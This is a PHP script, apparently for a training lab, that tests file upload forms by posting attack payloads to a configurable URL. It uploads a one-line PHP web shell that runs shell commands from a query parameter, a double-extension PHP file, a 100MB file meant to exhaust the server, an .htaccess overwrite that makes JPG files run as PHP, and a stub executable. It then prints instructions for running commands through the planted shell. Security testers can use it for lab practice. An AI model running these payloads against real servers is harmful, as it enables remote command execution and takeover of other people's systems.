<?php
/**
 * File Upload Vulnerability Tester
 * This script demonstrates various attack vectors against insecure file upload systems
 */
header('Content-Type: text/plain');
echo "=== File Upload Vulnerability Tester ===\n\n";

// Test configuration
$targetUrl = 'http://localhost/Training/upload.php'; // Change to your URL
$uploadDir = 'uploads/'; // Match your upload directory

// Test 1: PHP Shell Upload
echo "Test 1: Uploading PHP Shell\n";
echo "--------------------------\n";
$phpShell = [
    'name' => 'shell.php',
    'type' => 'application/x-php',
    'content' => '<?php system($_GET["cmd"]); ?>'
];
$response = uploadFile($phpShell, $targetUrl);
testResult($response, "PHP shell upload", "Check if you can execute commands via: $targetUrl/../$uploadDir/shell.php?cmd=whoami");

// Test 2: Double Extension Bypass
echo "\nTest 2: Double Extension Bypass\n";
echo "--------------------------------\n";
$doubleExt = [
    'name' => 'image.jpg.php',
    'type' => 'image/jpeg',
    'content' => '<?php echo "Executed as: ".system("whoami"); ?>'
];
$response = uploadFile($doubleExt, $targetUrl);
testResult($response, "Double extension bypass", "Check if executed: $targetUrl/../$uploadDir/image.jpg.php");

// Test 3: Large File Upload (DoS)
echo "\nTest 3: Large File Upload (DoS)\n";
echo "-------------------------------\n";
$largeFile = [
    'name' => 'huge.bin',
    'type' => 'application/octet-stream',
    'content' => str_repeat('A', 100 * 1024 * 1024) // 100MB file
];
$response = uploadFile($largeFile, $targetUrl);
testResult($response, "Large file upload", "Check if server accepted 100MB file (potential DoS)");

// Test 4: .htaccess Overwrite
echo "\nTest 4: .htaccess Overwrite\n";
echo "---------------------------\n";
$htaccess = [
    'name' => '.htaccess',
    'type' => 'text/plain',
    'content' => 'AddType application/x-httpd-php .jpg'
];
$response = uploadFile($htaccess, $targetUrl);
testResult($response, ".htaccess overwrite", "Try uploading a JPG with PHP code after this");

// Test 5: EXE File Upload
echo "\nTest 5: EXE File Upload\n";
echo "-----------------------\n";
$exeFile = [
    'name' => 'malicious.exe',
    'type' => 'application/x-msdownload',
    'content' => 'MZ...EXE HEADER...' // Simplified EXE header
];
$response = uploadFile($exeFile, $targetUrl);
testResult($response, "EXE file upload", "Check if executable was uploaded");

// Helper function to upload files
function uploadFile($fileData, $targetUrl) {
    $boundary = '----WebKitFormBoundary'.md5(time());
    $eol = "\r\n";
    
    $body = '--'.$boundary.$eol
          . 'Content-Disposition: form-data; name="uploaded_file"; filename="'.$fileData['name'].'"'.$eol
          . 'Content-Type: '.$fileData['type'].$eol.$eol
          . $fileData['content'].$eol
          . '--'.$boundary.'--'.$eol;
    
    $context = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: multipart/form-data; boundary='.$boundary,
            'content' => $body
        ]
    ]);
    
    return file_get_contents($targetUrl, false, $context);
}

// Helper function to evaluate results
function testResult($response, $testName, $nextSteps) {
    if (strpos($response, 'uploaded successfully') !== false) {
        echo "[VULNERABLE] $testName: Success!\n";
        echo "-> $nextSteps\n";
    } elseif (strpos($response, 'upload failed') !== false) {
        echo "[POSSIBLY BLOCKED] $testName: Server rejected the file\n";
    } else {
        echo "[UNKNOWN RESULT] $testName: Check manually\n";
    }
}

echo "\n=== Testing Complete ===\n";
echo "Note: This script tests for vulnerabilities - don't use for malicious purposes!\n";
?>
